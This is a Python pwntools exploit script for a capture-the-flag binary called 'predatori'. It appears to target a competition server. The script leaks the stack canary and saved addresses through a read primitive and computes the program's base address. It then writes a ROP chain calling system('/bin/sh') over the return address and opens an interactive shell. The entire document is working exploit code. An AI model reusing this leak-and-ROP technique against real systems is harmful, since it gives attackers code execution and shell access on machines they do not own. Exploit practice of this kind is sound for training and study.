#!/usr/bin/env python3
from pwn import *

elf = ELF('./predatori')
context.binary = elf
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('predatori.challs.olicyber.it', 15006)
else:
    r = gdb.debug('./predatori', '''
    break *www+191
    break *main+311
    continue
    ''')

f = 0
c = []
for i in range(0, 256, 8):
    r.recvuntil(b'Esci\n')
    r.sendline(b'1')
    r.recvline()
    r.send(bytes([i]))
    r.recvline()
    data = r.recv(8)
    if data.startswith(b'\x00') and data != b'\0'*8 and f == 0: # canary
        f = 1
        c.append([data.hex(), 0, 0])
    elif f == 1:
        f = 2
        c[-1][1] = hex(u64(data))
    elif f == 2:
        c[-1][2] = hex(u64(data))
        f = 0

addr = 0
print(c)
for i in c:
    r.recvuntil(b'Esci\n')
    r.sendline(b'1')
    r.recvline()
    r.send(int(i[2], 16).to_bytes(8, 'little'))
    r.recvline()
    if hex(u64(r.recv(8))) == '0xe800000000b822eb':
        addr = i
        print('Found main address offset 267: ', addr[2])
        break
elf.address = int(addr[2], 16) - 0xA49E
print('ELF base address: ', hex(elf.address))

binsh = elf.search(b'/bin/sh').__next__()
assert binsh == elf.address + 0x8e20f
system = elf.symbols['system']

print('system address: ', hex(system))
print('binsh address: ', hex(binsh))

retaddr = int(addr[1], 16) + 8

POP_RDI = elf.address + 0x99d1
ROP = [p64(POP_RDI), p64(binsh), p64(system)]

for i in ROP:
    r.recvuntil(b'Esci\n')
    r.sendline(b'2')
    r.recvline()
    r.sendline(p64(retaddr))
    r.recvline()
    r.send(i)
    retaddr += 8
r.interactive()